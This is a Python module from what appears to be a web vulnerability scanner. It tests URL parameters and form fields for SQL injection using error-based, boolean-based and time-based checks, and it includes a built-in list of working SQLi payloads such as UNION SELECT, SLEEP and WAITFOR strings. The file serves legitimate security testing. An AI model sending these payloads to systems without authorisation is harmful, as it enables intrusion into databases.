"""SQL Injection Detection Module."""

import re
import time

from modules.base import BaseModule
from lib.logger import log


class SQLiModule(BaseModule):
    """Detect SQL injection vulnerabilities."""

    name = "sqli"
    description = "SQL Injection detection (error-based, boolean-based, time-based)"

    # SQL error patterns
    SQL_ERRORS = [
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySQLSyntaxErrorException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*pg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"ORA-\d{5}", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"SQLite/JDBCDriver", "SQLite"),
        (r"SQLiteException", "SQLite"),
        (r"sqlite3.OperationalError", "SQLite"),
        (r"\[SQL Server\]", "MSSQL"),
        (r"\[Microsoft\]\[ODBC", "MSSQL"),
        (r"Unclosed quotation mark", "MSSQL"),
        (r"SQLSTATE\[", "PDO"),
        (r"Syntax error.*query expression", "MS Access"),
        (r"Microsoft JET Database", "MS Access"),
        (r"ODBC Microsoft Access", "MS Access"),
    ]

    def run(self, param_urls, forms):
        """Run SQL injection detection."""
        # Get payloads from AI or fallback
        payloads = self._get_payloads()

        # Test URLs with parameters
        for url in param_urls:
            params = self.get_params(url)
            for param in params:
                self._test_param(url, param, payloads)

        # Test forms
        for form in forms:
            self._test_form(form, payloads)

        return self.findings

    def _get_payloads(self):
        """Get SQLi payloads from AI or fallback."""
        if self.ai and self.ai.enabled:
            ai_payloads = self.ai.generate_payloads("sqli", {"technology": str(self.technology)})
            if ai_payloads:
                log.info(f"AI generated {len(ai_payloads)} SQLi payloads")
                return ai_payloads
        return self.ai._fallback_payloads("sqli") if self.ai else self._builtin_payloads()

    def _builtin_payloads(self):
        return [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "1' ORDER BY 1--", "1' ORDER BY 10--",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "1' AND 1=1--", "1' AND 1=2--",
            "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--",
            "admin'--", "' OR 1=1#", "') OR ('1'='1",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        ]

    def _test_param(self, url, param, payloads):
        """Test a single parameter for SQL injection."""
        # Step 1: Get baseline response
        try:
            baseline = self.client.get(url)
            baseline_len = len(baseline.text)
        except Exception:
            return

        for payload in payloads:
            self.delay()
            test_url = self.inject_param(url, param, payload)

            try:
                resp = self.client.get(test_url)

                # Check 1: Error-based detection
                for pattern, db_type in self.SQL_ERRORS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        self.add_finding(
                            "sql_injection", url, param, "critical",
                            f"SQL error ({db_type}): {pattern}",
                            payload, f"Error-based SQLi detected. DB type: {db_type}"
                        )
                        # AI analysis if available
                        if self.ai and self.ai.enabled:
                            finding = self.findings[-1]
                            analysis = self.ai.analyze_vulnerability(
                                "sql_injection", url, param, {"payload": payload}, resp.text
                            )
                            finding.ai_analysis = analysis
                        return  # confirmed, stop testing this param

                # Check 2: Boolean-based detection
                if payload in ["1' AND 1=1--", "' OR '1'='1"]:
                    true_url = self.inject_param(url, param, "1' AND 1=1--")
                    false_url = self.inject_param(url, param, "1' AND 1=2--")
                    try:
                        true_resp = self.client.get(true_url)
                        false_resp = self.client.get(false_url)
                        len_diff = abs(len(true_resp.text) - len(false_resp.text))
                        if len_diff > 100 and abs(len(true_resp.text) - baseline_len) < 50:
                            self.add_finding(
                                "sql_injection", url, param, "high",
                                f"Boolean-based: TRUE response ({len(true_resp.text)} bytes) vs FALSE response ({len(false_resp.text)} bytes)",
                                payload, "Boolean-based blind SQL injection detected"
                            )
                            return
                    except Exception:
                        pass

                # Check 3: Time-based detection
                if "SLEEP" in payload or "WAITFOR" in payload:
                    start = time.time()
                    self.client.get(test_url)
                    elapsed = time.time() - start
                    if elapsed >= 2.5:
                        self.add_finding(
                            "sql_injection", url, param, "high",
                            f"Time-based: response took {elapsed:.1f}s (expected ~3s delay)",
                            payload, "Time-based blind SQL injection detected"
                        )
                        return

            except Exception as e:
                log.debug(f"SQLi test error: {e}")

    def _test_form(self, form, payloads):
        """Test form inputs for SQL injection."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "hidden", "file", "checkbox", "radio"):
                continue

            for payload in payloads[:8]:  # Limit payloads for forms
                self.delay()
                data = {}
                for field in inputs:
                    if field["name"] == inp["name"]:
                        data[field["name"]] = payload
                    else:
                        data[field["name"]] = field.get("value", "test")

                try:
                    if method == "POST":
                        resp = self.client.post(action, data=data)
                    else:
                        resp = self.client.get(action, params=data)

                    for pattern, db_type in self.SQL_ERRORS:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            self.add_finding(
                                "sql_injection", action, inp["name"], "critical",
                                f"SQL error ({db_type}) in form field",
                                payload, f"Form-based SQL injection. DB: {db_type}"
                            )
                            return
                except Exception as e:
                    log.debug(f"Form SQLi test error: {e}")
